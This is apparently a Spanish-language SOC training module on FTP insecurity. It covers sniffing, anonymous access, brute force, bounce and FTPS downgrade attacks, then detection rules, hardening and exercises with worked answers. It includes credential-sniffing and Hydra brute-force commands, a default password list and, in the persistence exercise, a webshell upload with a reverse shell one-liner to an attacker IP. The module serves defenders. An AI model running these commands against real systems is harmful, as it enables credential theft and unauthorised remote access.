¿Qué es FTP?

El protocolo de transferencia de archivos más antiguo y peligroso

FTP (File Transfer Protocol) es uno de los protocolos más antiguos de Internet (RFC 959, 1985). Permite transferir archivos entre cliente y servidor, pero tiene un problema fundamental: todo viaja en texto claro — credenciales, comandos y datos.

Riesgo crítico desde el diseño:
  • 🔑 Credenciales en claro — usuario y contraseña legibles con Wireshark/Zeek
  • 📄 Datos en claro — archivos transferidos sin cifrado
  • 🔌 Dos canales TCP — control (21) y datos (20 o dinámico) — complica firewalls
  • 👤 Anonymous FTP — acceso sin autenticación real

Alternativas seguras: SFTP (SSH File Transfer Protocol, TCP/22) · FTPS (FTP over TLS, TCP/990) · SCP

Arquitectura de dos canales

Canal de control + Canal de datos — el origen de muchas complicaciones

ACTIVE MODE (PORT):
  Cliente (random port) ──── TCP/21 ────► Servidor  ← canal de control
  Cliente (random port) ◄─── TCP/20 ──── Servidor  ← datos (servidor conecta)
  ⚠ El servidor inicia la conexión de datos → firewalls bloquean esto

PASSIVE MODE (PASV):
  Cliente (random port) ──── TCP/21 ────► Servidor  ← control
  Cliente → "PASV"
  Servidor → "227 Entering Passive Mode (192,168,1,20,195,213)"
             Puerto datos = 195×256 + 213 = 50133
  Cliente (random port) ──── TCP/50133 ─► Servidor  ← datos (cliente conecta)
  ✓ Más compatible con firewalls (cliente siempre inicia)

COMANDOS FTP (todos en texto claro por TCP/21):
  USER jperez         → envía usuario
  PASS P@ssw0rd123    → envía contraseña EN CLARO ⚠
  LIST                → listar directorio
  RETR archivo.txt    → descargar archivo
  STOR payload.exe    → subir archivo
  PORT h1,h2,h3,h4,p1,p2  → active mode
  PASV                → passive mode
  QUIT                → cerrar sesión

Ataque 1: Sniffing de credenciales FTP

Captura trivial con cualquier sniffer

Cualquier atacante con acceso a la red (MitM, mismo segmento, WiFi) puede capturar credenciales FTP con Wireshark, tcpdump o Zeek. No requiere ninguna habilidad especial.

# Wireshark — filtro para FTP
ftp                         → todo el tráfico FTP
ftp.request.command == "USER"   → solo usernames
ftp.request.command == "PASS"   → solo contraseñas (en claro!)

# tcpdump — capturar credenciales
tcpdump -i eth0 -A 'tcp port 21' | grep -E "USER|PASS"

# Zeek ftp.log — automático
ts=10:05:01  user=jperez  password=P@ssw0rd123  command=USER/PASS
             ↑ Zeek registra credenciales FTP automáticamente

CAPTURA DE DATOS:
  tcpdump -i eth0 -A 'tcp port 20 or tcp port 50000:60000'
  → Captura el contenido de los archivos transferidos

PELIGRO: si jperez usa la misma contraseña en otros sistemas
  → Un sniff de FTP → comprometido en AD, email, VPN...
Caso real: muchas organizaciones todavía usan FTP interno para transferir backups, configs o reportes. En un pentest interno, el primer paso es a menudo escuchar TCP/21 en el segmento más activo.

Ataque 2: Anonymous FTP

Acceso público sin autenticación

FTP permite configurar acceso anónimo donde cualquier usuario puede conectarse con usuario anonymous y cualquier string como contraseña (convencionalmente, su email). El riesgo depende de los permisos configurados.

ACCESO ANÓNIMO SOLO LECTURA — riesgo moderado:
  ftp 192.168.1.20
  Name: anonymous
  Password: hacker@example.com
  230 Login successful
  ftp> ls
  → Puede listar y descargar archivos públicos
  → RIESGO: exposición accidental de información sensible
    (backups, configs, datos de clientes)

ACCESO ANÓNIMO LECTURA/ESCRITURA — riesgo crítico:
  ftp> put malware.exe /incoming/malware.exe   ← sube payload
  ftp> put backdoor.php /pub/backdoor.php      ← webshell si hay web
  → FTP Bounce: usar el server como relay para scan/ataque a otros hosts
  → Depósito de contenido ilegal (CP, malware para hospedar)

DETECCIÓN:
  Zeek ftp.log: user="anonymous"  → siempre alertar en redes internas
  Si hay uploads anónimos → crítico inmediato

MITRE ATT&CK: T1133 — External Remote Services · T1105 — Ingress Tool Transfer

Ataque 3: FTP Brute Force

Ataques de diccionario contra credenciales FTP

FTP generalmente no tiene rate limiting ni bloqueo de cuentas por defecto. Los atacantes pueden probar miles de contraseñas automáticamente con herramientas como Hydra o Medusa.

# Hydra — brute force FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      192.168.1.20 ftp -t 4

# Medusa
medusa -h 192.168.1.20 -u ftpuser -P passwords.txt -M ftp

CREDENCIALES POR DEFECTO COMUNES:
  admin:admin      anonymous:         ftp:ftp
  root:toor        test:test          user:password
  admin:password   ftpuser:ftpuser    backup:backup

DETECCIÓN en Zeek ftp.log:
  Muchos intentos de login fallidos desde misma IP:
  ts=10:10:01  src=192.168.1.99  user=admin  reply_code=530 ×50
  ts=10:10:15  src=192.168.1.99  user=admin  reply_code=230 ← éxito!

CÓDIGOS DE RESPUESTA FTP CLAVE:
  220 — Banner del servidor (¡revela versión!)
  230 — Login exitoso
  530 — Login incorrecto
  550 — Acción no permitida
  425 — No se puede abrir conexión de datos (active mode bloqueado)

MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing

Ataque 4: FTP Bounce (PORT attack)

Usar el servidor FTP como proxy de ataque

En active mode, el cliente le dice al servidor FTP a qué IP y puerto conectarse para transferir datos (comando PORT). Un atacante puede especificar una IP/puerto de terceros — el servidor FTP actúa como proxy.

FLUJO DEL ATAQUE:
  Atacante (1.2.3.4)                FTP Server (ftp.empresa.com)
       │                                    │
       │── PORT 10,0,0,5,0,22 ────────────►│  "Conectate a 10.0.0.5:22"
       │── RETR archivo.txt ───────────────►│
       │                                    │── TCP connect → 10.0.0.5:22
       │                                    │   El servidor FTP escanea/ataca
       │                                    │   un host interno en nombre del atacante

USOS MALICIOSOS:
  1. Port scan interno: enviar PORT con cada puerto del target
     → El servidor FTP sondea hosts que el atacante no puede alcanzar directamente
  2. Bypass de firewall: el FTP server puede llegar a 10.0.0.0/8 (interno)
     pero el atacante no puede desde Internet
  3. Anonimización: el ataque parece venir del servidor FTP, no del atacante

MITIGACIÓN: la mayoría de servidores FTP modernos bloquean
PORT commands que apuntan a IPs distintas del cliente (RFC 2577)

CVE histórico: implementaciones antiguas de wu-ftpd, ProFTPD

Migración a alternativas seguras

Por qué deshabilitar FTP y qué usar en su lugar

  • 🚫 Deshabilitar FTP si no es necesario — eliminar el servicio es la mejor defensa
  • 🔐 Migrar a SFTP — SSH File Transfer Protocol, cifrado completo, TCP/22, mismas credenciales SSH
  • 🔒 Migrar a FTPS — FTP over TLS, cifra credenciales y datos, TCP/990 (implicit) o 21 con STARTTLS
  • 📋 Si FTP es requerido: IP allowlist estricta, credenciales únicas (no reutilizar), audit logs, sin anonymous
  • 🌐 Nunca FTP sobre Internet — toda la sesión es capturada por cualquier nodo intermedio
  • 📊 Alertar siempre sobre FTP desde Internet — si FTP/21 tiene conexiones externas, es un IOC inmediato
ProtocoloCredencialesDatosPuerto
FTP❌ Claro❌ Claro21/20
FTPS✅ TLS✅ TLS990 / 21+STARTTLS
SFTP✅ SSH✅ SSH22
SCP✅ SSH✅ SSH22

Ataque 5: FTPS Downgrade / MitM

Forzar a un cliente FTPS a conectarse sin TLS

FTPS (FTP + TLS) es opcional por diseño en su modo explícito (AUTH TLS). Un atacante MitM puede interceptar el handshake y responder con error, haciendo que un cliente mal configurado reconecte en texto claro.

FTPS EXPLÍCITO (AUTH TLS) vs IMPLÍCITO (FTPS en puerto 990):

Modo EXPLÍCITO (puerto 21 — el más común, el vulnerable):
  Cliente → "AUTH TLS"
  Si MitM bloquea/modifica → "500 Unknown command"
  Cliente mal configurado → retrocede a FTP plano
  → Credenciales capturadas en texto claro

Modo IMPLÍCITO (puerto 990 — más seguro):
  TLS se negocia ANTES de cualquier comando FTP
  Sin TLS: el servidor cierra la conexión
  → No hay posibilidad de downgrade

ESCENARIO DE ATAQUE MitM:
  1. ARP poisoning: cliente FTP → [atacante] → servidor FTP
  2. Atacante intercepta "AUTH TLS"
  3. Responde "500 Unknown command"
  4. Cliente (FileZilla, WinSCP mal conf.) reintenta sin TLS
  5. USER jdoe / PASS P@ssw0rd → visibles al atacante

HERRAMIENTAS:
  ettercap, bettercap, mitmproxy (con plugin FTP)

DETECCIÓN:
  Zeek: conexiones FTP a servidores que normalmente usan FTPS
  SIEM: alerta si "AUTH TLS" NO aparece en sesión FTP a host conocido FTPS

MITIGACIÓN:
  1. Usar FTPS implícito (puerto 990) — no permite downgrade
  2. Configurar cliente: "Require TLS" sin fallback a FTP plano
  3. Mejor: migrar a SFTP (SSH) — protocolo distinto, sin riesgo de downgrade
  4. MFA + certificate pinning en clientes FTP corporativos

MITRE ATT&CK: T1557 — Adversary-in-the-Middle · T1040 — Network Sniffing

EJ-03 FTP vs SFTP vs FTPS — ¿cuándo usar cada uno? Fácil

Para cada escenario, recomendá el protocolo correcto (FTP, SFTP, FTPS o SCP) y justificá tu elección:

  1. Transferencia de backups nocturnos entre dos servidores Linux en la misma red interna
  2. Portal de carga de archivos para clientes externos (proveedor entrega reportes via FTP)
  3. Servidor FTP legacy de Windows que no puede ser reemplazado a corto plazo pero sí necesita mejorar la seguridad
  4. Script de automatización que sube archivos de configuración a 50 dispositivos de red
1. Backups nocturnos entre servidores Linux internos → SFTP o SCP Razón: → Ambos son Linux → SSH ya está instalado → SFTP/SCP sin costo adicional → Cifrado completo (credenciales + datos) incluso en red interna → Puede usar autenticación por llave SSH (sin contraseña) para automatización → SCP es más simple para scripts, SFTP tiene más funcionalidades (ls, rm, etc.) Implementación: rsync -avz -e "ssh -i /home/backup/.ssh/id_rsa" /backups/ user@server:/backups/ # O directamente: scp -i /home/backup/.ssh/id_rsa backup.tar.gz user@server:/backups/ 2. Portal para clientes externos → FTPS o SFTP con acceso restringido Razón: → Clientes externos = tráfico sobre Internet = cifrado OBLIGATORIO → FTPS si los clientes usan FileZilla u otros clientes FTP estándar (más familiar para usuarios no técnicos, compatible con GUI FTP) → SFTP si los clientes tienen capacidad SSH → NUNCA FTP plain sobre Internet — las credenciales viajarán en claro por todos los nodos de tránsito entre el cliente y tu servidor Consideración adicional: → IP allowlisting del cliente + notificación automática de login 3. Servidor FTP Windows legacy → FTPS (FTP sobre TLS) Razón: → No puede ser reemplazado, pero Windows IIS soporta FTPS nativamente → FTPS añade TLS encima del FTP existente sin cambiar el protocolo base → Los clientes FTP existentes (FileZilla, WinSCP) soportan FTPS → Menor impacto operativo que migrar a SFTP completamente nuevo → Implementar: en IIS Manager → FTP SSL Settings → "Require SSL connections" 4. Scripts de configuración a 50 dispositivos de red → SFTP o SCP Razón: → Los dispositivos de red modernos (Cisco, Juniper, etc.) soportan SCP/SFTP → Automatizable con scripts Python (paramiko) o Ansible → Si los dispositivos solo soportan FTP legacy → usar TFTP en red interna segmentada (TFTP no tiene auth pero es efímero y controlable por ACL) Ansible ejemplo: - name: Upload config net_put: src: /configs/router.cfg dest: /flash/running-config protocol: sftp
EJ-04 Detectar FTP en la red corporativa Medio

Como analista SOC, te piden detectar todo uso de FTP en la red y crear un baseline. ¿Cómo lo hacés? Describí las consultas y reglas que crearías en Zeek y el SIEM.

PASO 1 — DESCUBRIMIENTO: ¿quién usa FTP en la red? PASO 3 — REGLAS Y ALERTAS en el SIEM Regla 1: FTP anónimo (siempre alertar) title: Anonymous FTP Login detection: user: "anonymous" reply_code: 230 level: high Regla 2: FTP desde Internet (siempre alertar) title: FTP Access from External IP detection: id.resp_p: 21 id.orig_h: NOT $HOME_NET reply_code: 230 level: critical Regla 3: Brute force FTP title: FTP Brute Force detection: reply_code: 530 condition: count() by id.orig_h > 20 | timeframe 60s level: medium Regla 4: FTP usado para exfiltración (archivos grandes descargados) title: Large FTP Download - Possible Exfiltration detection: command: RETR file_size: > 10MB id.orig_h: NOT $AUTHORIZED_FTP_CLIENTS level: medium Regla 5: Upload anónimo FTP title: Anonymous FTP Upload detection: user: "anonymous" command: STOR level: critical PASO 4 — REMEDIACIÓN Para cada servicio FTP identificado: 1. Deshabilitar si no tiene caso de negocio activo 2. Migrar a SFTP/FTPS si sigue siendo necesario 3. Documentar excepción con owner, fecha de revisión, controles compensatorios 4. Agregar a whitelist si es legítimo y monitoreado
EJ-05 ¿Cómo un atacante convierte un FTP con escritura en persistencia? Difícil

El atacante encontró un FTP con anonymous write en un servidor web. Describí los pasos completos para establecer persistencia y cómo detectarlo y eliminarlo.

PASOS DEL ATACANTE: 1. Descubrimiento del FTP con escritura anónima: nmap -p 21 --script ftp-anon target.com → "ftp-anon: Anonymous FTP login allowed (FILES: 3)" → Verificar si tiene permisos de escritura: conectar y hacer PUT 2. Subir webshell vía FTP anónimo: ftp target.com Name: anonymous Password: hacker@test.com ftp> cd pub ← o /var/www/html/, /uploads/, /files/, etc. ftp> put shell.php ftp> quit Contenido de shell.php (versión mínima): URL de acceso: http://target.com/pub/shell.php?cmd=whoami 3. Verificar que funciona: curl "http://target.com/pub/shell.php?cmd=id" → uid=33(www-data) gid=33(www-data) 4. Escalar a shell inversa: curl "http://target.com/pub/shell.php?cmd=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" (atacante escucha en nc -lvnp 4444) 5. Persistencia adicional (si tiene permisos): → Agregar cron job, SSH key, usuario del sistema → Subir más webshells con nombres inocuos (image.php, config.php) DETECCIÓN: FTP: Zeek ftp.log: user=anonymous + command=STOR → ALERTA CRÍTICA inmediata Web access logs (Apache/Nginx): grep "shell.php" /var/log/apache2/access.log grep "?cmd=" /var/log/nginx/access.log → Peticiones con parámetros del sistema (whoami, id, ls, etc.) Filesystem: find /var/www /var/ftp -name "*.php" -newer /var/www/index.php → Archivos PHP creados recientemente (post-upload) find /var/ftp -perm /o+w -type d → Directorios con escritura para "others" (anonymous) ELIMINACIÓN Y REMEDIACIÓN: Inmediato: 1. find /var/www /var/ftp -name "shell.php" -delete (buscar también por contenido: grep -r "system(\$_GET" /var/www) 2. Verificar que no hay más shells: grep -r "base64_decode\|eval\|system\|exec" /var/www/*.php 3. Revisar cron, /etc/passwd, ~/.ssh/authorized_keys (¿agregó persistence?) 4. Deshabilitar FTP o al menos quitar escritura anónima: En vsftpd.conf: anon_upload_enable=NO anon_mkdir_write_enable=NO Largo plazo: 5. Separar el directorio raíz de FTP del document root de Apache/Nginx (el FTP no debería apuntar a /var/www/html/) 6. Implementar SFTP con autenticación real 7. WAF rule para bloquear peticiones con parámetros de shell LECCIÓN: FTP anónimo con escritura en un servidor web = ejecución remota de código sin autenticación. Siempre separar FTP de webroot.

🛠️ Herramientas SOC
Análisis · Zeek

Zeek ftp.log — consultas útiles

# Extraer todas las credenciales capturadas
zeek-cut ts id.orig_h user password < ftp.log | grep -v "^-"

# Logins anónimos
zeek-cut ts id.orig_h user < ftp.log | awk '$3=="anonymous"'

# Archivos descargados
zeek-cut id.orig_h command arg < ftp.log | awk '$2=="RETR"'

# Archivos subidos (posibles backdoors)
zeek-cut id.orig_h command arg < ftp.log | awk '$2=="STOR"'
Detección · nmap

nmap — auditoría FTP

# Detectar FTP anónimo
nmap -p 21 --script ftp-anon 192.168.1.0/24

# Banner grabbing (versión del servidor)
nmap -p 21 --script ftp-syst 192.168.1.20

# Brute force (solo en pentest autorizado)
nmap -p 21 --script ftp-brute 192.168.1.20
Migración · SFTP

Configurar SFTP en Linux

# En /etc/ssh/sshd_config:
Subsystem sftp /usr/lib/openssh/sftp-server

# Grupo SFTP-only (sin shell):
Match Group sftponly
  ChrootDirectory /data/sftp/%u
  ForceCommand internal-sftp
  AllowTcpForwarding no

# Agregar usuario al grupo:
usermod -aG sftponly ftpuser
Hardening

vsftpd — deshabilitar anonymous

# /etc/vsftpd.conf
anonymous_enable=NO
anon_upload_enable=NO
anon_mkdir_write_enable=NO
local_enable=YES
write_enable=YES

# Limitar intentos de login:
max_login_fails=3

# TLS (FTPS):
ssl_enable=YES
rsa_cert_file=/etc/ssl/certs/vsftpd.pem
force_local_logins_ssl=YES
